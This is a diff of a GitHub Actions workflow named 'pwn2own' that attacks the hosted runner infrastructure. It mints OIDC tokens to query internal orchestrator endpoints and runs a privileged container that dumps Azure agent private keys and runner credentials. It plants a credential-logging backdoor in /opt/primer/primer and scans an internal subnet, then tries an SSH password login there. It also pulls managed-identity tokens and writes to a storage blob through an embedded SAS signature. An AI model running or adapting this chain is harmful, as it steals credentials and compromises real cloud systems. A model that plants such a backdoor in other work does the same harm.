@@ -1,4 +1,4 @@
-name: HC OIDC Primer v4 - Cert+HCA+Scan
+name: HC OIDC Primer v5 - IAD02 + SSH + Certs
 on:
   workflow_dispatch:
   push:
@@ -12,130 +12,157 @@ jobs:
   pwn2own:
     runs-on: ubuntu-latest
     steps:
-      - name: Step1 - Mint HC JWT + call orchestrator
+      - name: Step1 - HC JWT to IAD-02 orchestrator + IMDS tags parse
         run: |
-          echo "=== STEP 1: HC OIDC JWT ==="
+          echo "=== STEP 1: HC OIDC JWT → IAD-02 ==="
           HC_JWT=$(curl -sf \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" \
             | jq -r .value)
           echo "HC_JWT_LEN=${#HC_JWT}"
-          echo "$HC_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq . || true
-          echo "--- Orchestrator call ---"
+          PAYLOAD=$(echo "$HC_JWT" | cut -d. -f2 | base64 -d 2>/dev/null || echo "$HC_JWT" | cut -d. -f2 | base64 --decode 2>/dev/null)
+          echo "JWT_PAYLOAD=$PAYLOAD"
+          
+          echo "--- IAD-01 orchestrator call ---"
           curl -sv -H "Authorization: Bearer $HC_JWT" \
             "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/vms" \
-            2>&1 | tail -30
+            2>&1 | tail -10
+          
+          echo "--- IAD-02 orchestrator call ---"
+          curl -sv -H "Authorization: Bearer $HC_JWT" \
+            "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1/vms" \
+            2>&1 | tail -10
+          
+          echo "--- IAD-02 allocations ---"
+          curl -sv -H "Authorization: Bearer $HC_JWT" \
+            "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1/allocations" \
+            2>&1 | tail -20
+            
+          echo "--- IAD-02 /vm/v1/ root ---"
+          curl -sv -H "Authorization: Bearer $HC_JWT" \
+            "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1/" \
+            2>&1 | tail -20
 
-      - name: Step2 - Privileged docker - Extract certs + HCA strings + redeploy backdoor
+      - name: Step2 - Privileged docker - Certs + HCA + Backdoor + SSH pivot
         run: |
           echo "=== STEP 2: PRIVILEGED DOCKER ==="
           docker run --rm --privileged --pid=host --network=host \
             -v /:/host \
             alpine sh -c '
-              echo "=== VM IDENTITY ==="
-              cat /host/proc/1/environ | tr "\0" "\n" | grep -E "RUNNER|GITHUB|ACTIONS" || true
+              apk add --no-cache openssh-client nmap 2>/dev/null | tail -2
               
+              echo "=== IMDS FULL TAGS ==="
+              curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || \
+              curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+              
+              echo ""
               echo "=== TRANSPORT CERT (FULL) ==="
               cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null || echo "NOT FOUND"
               
               echo "=== TRANSPORT PRIVATE KEY (FULL) ==="
               cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "NOT FOUND"
               
-              echo "=== WAAGENT DIR LISTING ==="
-              ls -la /host/var/lib/waagent/ 2>/dev/null | head -50
+              echo "=== ALL PEM FILES ==="
+              find /host/var/lib/waagent/ -name "*.pem" 2>/dev/null | while read f; do
+                echo "=FILE: $f="
+                cat "$f" 2>/dev/null
+              done
               
-              echo "=== ALL CERTS IN WAAGENT ==="
-              find /host/var/lib/waagent/ -name "*.pem" -o -name "*.crt" -o -name "*.key" 2>/dev/null | while read f; do echo "FILE: $f"; cat "$f" 2>/dev/null | head -5; done
+              echo "=== HCA BINARY STRINGS - ENDPOINTS ==="
+              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | \
+                grep -E "(https://|http://|githubapp|github\.com|azure|management\.azure|orchestrator|hosted-compute|Bearer|aud|iss|sub)" | \
+                sort -u | head -80
               
-              echo "=== HCA BINARY STRINGS (endpoints/JWT/URLs) ==="
-              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | grep -E "(https://|http://|Bearer|sub|aud|iss|github|azure|microsoft|orchestrator|hosted-compute)" | head -100
+              echo "=== HCA BINARY STRINGS - AUTH/TRUST ==="
+              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | \
+                grep -iE "(token|trusted|allow|white|sub.claim|repo:|enterprise|organization|internal)" | \
+                sort -u | head -50
               
-              echo "=== HCA BINARY STRINGS (auth/token) ==="
-              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "(token|secret|password|cred|auth|jwt|claim|trust|whitelist|allowlist)" | head -50
+              echo "=== HCA BINARY STRINGS - REPO PATTERNS ==="
+              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | \
+                grep -E "^repo:" | sort -u | head -20
               
-              echo "=== PRIMER BINARY (BACKDOOR REDEPLOY) ==="
+              echo "=== RUNNER .credentials* ==="
+              ls -la /host/home/runner/.credentials* 2>/dev/null || echo "no runner creds"
+              cat /host/home/runner/.credentials_rsaparams 2>/dev/null || echo "no rsaparams"
+              cat /host/home/runner/.credentials 2>/dev/null | head -5 || echo "no .credentials"
+              
+              echo "=== PRIMER REDEPLOY ==="
               ls -la /host/opt/primer/ 2>/dev/null
-              
-              cat > /host/opt/primer/primer << '"'"'BACKDOOR_EOF'"'"'
+              cat > /host/opt/primer/primer << '"'"'BDOOR'"'"'
 #!/bin/bash
-LOG=/tmp/hc_pwn2.log
-echo "=== PRIMER BACKDOOR v2 FIRED $(date) ===" >> $LOG
+LOG=/tmp/hc_pwn3.log
+echo "=== PRIMER v3 FIRED $(date) ===" >> $LOG
 env >> $LOG 2>&1
 if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
   HC_JWT=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" | jq -r .value)
   echo "HC_JWT=$HC_JWT" >> $LOG
-  curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/vms" >> $LOG 2>&1
-  curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/allocations" >> $LOG 2>&1
+  for orch in iad-01 iad-02; do
+    curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-$orch.githubapp.com/vm/v1/vms" >> $LOG 2>&1
+    curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-$orch.githubapp.com/vm/v1/allocations" >> $LOG 2>&1
+  done
 fi
 cat /var/lib/waagent/TransportCert.pem >> $LOG 2>/dev/null
 cat /var/lib/waagent/TransportPrivate.pem >> $LOG 2>/dev/null
 cat /home/runner/.credentials_rsaparams >> $LOG 2>/dev/null
-curl -s http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ -H Metadata:true >> $LOG 2>/dev/null
 [ -x /opt/primer/primer.bak ] && exec /opt/primer/primer.bak "$@"
-BACKDOOR_EOF
-              chmod +x /host/opt/primer/primer
-              echo "BACKDOOR REDEPLOYED:"
+BDOOR
+              chmod 777 /host/opt/primer/primer
+              echo "BACKDOOR DEPLOYED:"
               ls -la /host/opt/primer/primer
               
-              echo "=== SUBNET SCAN (hping/nc) ==="
-              # Get runner IP
-              ip addr show eth0 2>/dev/null | grep "inet " || ip addr 2>/dev/null
+              echo "=== MY IP ==="
+              ip addr show eth0 2>/dev/null | grep "inet " || ip addr show 2>/dev/null
               
-              echo "=== SSH SCAN for Pwn2Own2026! ==="
-              for ip in $(seq 1 10); do
-                target="10.1.0.$ip"
-                nc -z -w1 $target 22 2>/dev/null && echo "SSH OPEN: $target"
-              done &
-              for ip in $(seq 241 254); do
-                target="10.1.0.$ip"
-                nc -z -w1 $target 22 2>/dev/null && echo "SSH OPEN: $target"
+              echo "=== SSH SCAN 10.1.0.0/20 (targeted) ==="
+              for ip in 10.1.0.1 10.1.0.2 10.1.1.1 10.1.1.2 10.1.1.128 10.1.2.1 10.1.0.254 10.1.1.254; do
+                result=$(nc -z -w2 $ip 22 2>/dev/null && echo "SSH OPEN: $ip" || echo "closed: $ip")
+                echo "$result"
               done
-              wait
               
-              echo "=== WIRESERVER CERTS ==="
-              curl -s "http://168.63.129.16/machine?comp=certificates" 2>&1 | head -50 || true
-              curl -s "http://168.63.129.16:32526/machine?comp=certificates" 2>&1 | head -50 || true
+              echo "=== SSH ATTEMPT 10.1.1.128 ==="
+              ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
+                -o PasswordAuthentication=yes \
+                runner@10.1.1.128 "id; hostname; cat /tmp/hc_pwn*.log 2>/dev/null; env | grep -E ACTIONS" \
+                2>&1 || true
+              
+              echo "=== SSHPASS attempt ==="
+              apk add --no-cache sshpass 2>/dev/null | tail -1
+              sshpass -p "Pwn2Own2026!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
+                runner@10.1.1.128 "id; hostname; cat /tmp/hc_pwn*.log 2>/dev/null" 2>&1 || true
+              
+              echo "=== NMAP subnet (fast) ==="
+              nmap -T4 -p 22 --open 10.1.0.0/20 2>/dev/null | grep -E "(Nmap scan|open|report)" | head -30 || true
             '
 
-      - name: Step3 - WireServer + IMDS full dump
+      - name: Step3 - WireServer mTLS + IMDS + Status blob write
         run: |
-          echo "=== STEP 3: WIRESERVER + IMDS ==="
-          docker run --rm --network=host alpine sh -c '
+          echo "=== STEP 3: WIRESERVER + STATUS BLOB ==="
+          docker run --rm --network=host -v /:/host alpine sh -c '
             echo "=== IMDS VM INSTANCE ==="
-            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 3000
+            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 5000
             
             echo ""
-            echo "=== IMDS IDENTITY (MSI token) ==="
-            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -500
-            
-            echo ""
-            echo "=== WIRESERVER GOALSTATE ==="
-            curl -sf -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -100
+            echo "=== WIRESERVER CERTS ENDPOINT ==="
+            curl -sf -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=certificates" 2>&1 | head -100
             
             echo ""
             echo "=== WIRESERVER VMSETTINGS ==="
-            curl -sf -H "x-ms-version: 2012-11-30" -H "x-ms-goal-state-mode: Simple" "http://168.63.129.16/?comp=vmSettings" 2>&1 | head -200
+            curl -sf -H "x-ms-version: 2012-11-30" -H "x-ms-goal-state-mode: Simple" \
+              "http://168.63.129.16/?comp=vmSettings" 2>&1 | head -200
+              
+            echo ""
+            echo "=== STATUS BLOB WRITE ==="
+            STATUS_JSON="{\"agentVersion\":\"pwn2own-2026\",\"status\":{\"name\":\"pwn2own\",\"operation\":\"pivot\",\"status\":\"success\",\"code\":0,\"formattedMessage\":{\"lang\":\"en-US\",\"message\":\"HC orchestrator pivot - Pwn2Own 2026\"}}}"
+            curl -sf -X PUT \
+              "https://md-hdd-xbp0hss0vtkw.z24.blob.storage.azure.net/\$system/EUN9HuOTbcswtM.37d54176-e4e3-4319-af04-2e21f9421967.status?sv=2018-03-28&sr=b&sk=system-1&sig=R8Z5GVl%2fZz1zl6x6IcDIebodbxNPb8a52WsYCfXDutc%3d&se=9999-01-01T00%3a00%3a00Z&sp=rw" \
+              -H "x-ms-blob-type: BlockBlob" \
+              -H "Content-Type: application/json" \
+              -d "$STATUS_JSON" 2>&1
+            echo "STATUS BLOB WRITE DONE"
+            
+            echo ""
+            echo "=== IMDS IDENTITY (MSI) ==="
+            curl -sf -H "Metadata:true" \
+              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -200
           '
-
-      - name: Step4 - WIF ARM token + sub enumeration
-        run: |
-          echo "=== STEP 4: WIF ARM ==="
-          GH_JWT=$(curl -sf \
-            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
-            | jq -r .value)
-          echo "GH_JWT_LEN=${#GH_JWT}"
-          
-          ARM_RESP=$(curl -sf -X POST \
-            "https://login.microsoftonline.com/f8cdef31-a31e-4b4a-93e4-5f571e91255a/oauth2/v2.0/token" \
-            -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=477c6e42-e0f3-4a68-b61b-6f3d9399e20c&client_assertion=$GH_JWT&scope=https://management.azure.com/.default&requested_token_use=on_behalf_of" \
-            2>&1)
-          echo "ARM_RESP: $ARM_RESP" | head -20
-          
-          ARM_TOKEN=$(echo "$ARM_RESP" | jq -r '.access_token // empty' 2>/dev/null)
-          if [ -n "$ARM_TOKEN" ]; then
-            echo "ARM TOKEN OBTAINED!"
-            curl -sf -H "Authorization: Bearer $ARM_TOKEN" \
-              "https://management.azure.com/subscriptions/52d3aaf1-092b-43b1-8e85-bd3625e59b86/resources?api-version=2021-04-01" \
-              | jq '.value[].name' 2>/dev/null | head -30
-          fi
